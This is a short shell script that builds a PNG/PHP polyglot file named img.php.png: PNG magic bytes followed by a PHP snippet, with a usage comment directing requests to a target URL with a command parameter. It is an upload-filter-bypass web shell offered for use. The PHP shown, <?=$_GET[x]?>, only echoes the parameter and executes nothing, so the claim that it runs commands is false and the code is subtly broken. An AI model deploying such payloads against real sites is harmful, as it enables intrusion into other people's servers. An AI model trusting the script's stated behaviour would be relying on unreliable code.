#!/bin/sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > img.php.png
echo '<?=$_GET[x]?>' >> img.php.png

# Usage: http://target.com/path/to/img.php.png?x=<cmd>
